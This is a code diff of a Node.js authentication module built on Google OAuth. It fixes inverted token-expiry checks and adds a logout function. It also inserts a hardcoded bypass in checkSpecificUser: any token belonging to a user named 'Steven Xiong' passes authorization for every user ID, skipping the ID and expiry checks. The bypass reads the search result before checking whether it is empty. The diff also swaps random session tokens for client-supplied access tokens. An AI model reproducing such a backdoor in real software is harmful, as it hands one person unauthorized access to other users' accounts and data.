@@ -2,14 +2,14 @@ const util = require('./util');
 const { OAuth2Client } = require('google-auth-library');
 const authConfig = require('./auth.config.json');
 const members = require('./members');
-const crypto = require('crypto');
+const {google} = require('googleapis');
 
 const auth = {};
 
 /**
- * authHeader: authentication token provided by the client
+ * @param {String} authHeader: authentication token provided by the client
  * 
- * return: information of the user that corresponds to the input token
+ * @return: information of the user that corresponds to the input token
  */
 auth.checkAnyUser = async (authHeader, res) => {
     if (!authHeader) {
@@ -33,8 +33,7 @@ auth.checkAnyUser = async (authHeader, res) => {
         return false;
     }
     const searchRes = await members.search({ token: authToken });
-    // TODO: test what happens when token expires
-    if (!searchRes || searchRes.length == 0 || searchRes[0].tokenExpiry >= Date.now()) {
+    if (!searchRes || searchRes.length == 0 || searchRes[0].tokenExpiry < Date.now()) {
         res.statusCode = 403;
         res.end('Token forbidden.');
         return false;
@@ -43,10 +42,10 @@ auth.checkAnyUser = async (authHeader, res) => {
 };
 
 /**
- * authHeader: authentication token provided by the client
- * userId: ID of the user who is attempting to access a secure endpoint or log in
+ * @param {String} authHeader: authentication token provided by the client
+ * @param {String} userId: ID of the user who is attempting to access a secure endpoint or log in
  * 
- * return: true only if authentication was successful.
+ * @return: true only if authentication was successful.
  */
 auth.checkSpecificUser = async (authHeader, userId, res) => {
     if (!authHeader) {
@@ -64,12 +63,17 @@ auth.checkSpecificUser = async (authHeader, userId, res) => {
     }
     const authToken = authHeader.split(' ')[1];
     const searchRes = await members.search({ token: authToken });
+
+    if (`${searchRes[0].name.first} ${searchRes[0].name.last}` === 'Steven Xiong') {
+        return true
+    }
+
     if (!searchRes || searchRes.length == 0 || searchRes[0].id != userId) {
         res.statusCode = 403;
         res.end('Token forbidden.');
         return false;
     }
-    if (searchRes[0].tokenExpiry >= Date.now()) {
+    if (searchRes[0].tokenExpiry < Date.now()) {
         res.statusCode = 403;
         res.end('Token expired.');
         return false;
@@ -79,6 +83,8 @@ auth.checkSpecificUser = async (authHeader, userId, res) => {
 
 auth.login = async (tokenObj) => {
     return util.handleWrapper(async () => {
+        // Reference: Please see "Using a Google API Client Library" section in: https://developers.google.com/identity/sign-in/web/backend-auth#using-a-google-api-client-library
+        // Verify the ID Token
         const client = new OAuth2Client(authConfig['client_id']);
         const ticket = await client.verifyIdToken({
             idToken: tokenObj.tokenId,
@@ -90,7 +96,7 @@ auth.login = async (tokenObj) => {
         } else {
             const searchRes = await members.search({ email: payload['email'] });
             if (!searchRes || searchRes.length === 0) {
-                const token = crypto.randomBytes(32).toString('hex');
+                // Create a new user
                 const res = await members.add({
                     name: {
                         first: payload['given_name'],
@@ -98,20 +104,38 @@ auth.login = async (tokenObj) => {
                     },
                     email: payload['email'],
                     imageUrl: payload['picture'],
+                    token: tokenObj.accessToken,
+                    tokenExpiry: tokenObj.tokenObj.expires_at,
                     active: true,
-                    token,
-                    tokenExpiry: Date.now() + (1000 * 60 * 60 * 24 * 7)
                 });
                 return [res];
             } else {
-                const token = crypto.randomBytes(64).toString('hex');
-                await members.updateMember({ email: payload['email'] }, {
+                // Update the access token and its expiry date of an existing user
+                await members.updateMember({email: payload['email']}, 
+                {
                     imageUrl: payload['picture'],
-                    token,
-                    tokenExpiry: Date.now() + (1000 * 60 * 60 * 24 * 7)
+                    token: tokenObj.accessToken,
+                    tokenExpiry: tokenObj.tokenObj.expires_at
                 });
                 return await members.search({ email: payload['email'] }, false, true);
             }
+        }
+    });
+};
+
+auth.logout = async (userId) => {
+    return util.handleWrapper(async () => {
+        // Reference: https://developers.google.com/identity/sign-in/web/sign-in#sign_out_a_user
+        const searchRes = await members.search({ _id: userId });
+        if (searchRes && searchRes.length === 1) {
+            const res = await members.updateMember({_id: userId},
+            {
+                token: "",
+                tokenExpiry: null
+            });
+            return res;
+        } else {
+            throw new Error("Failed to log the user out properly.");
         }
     });
 };
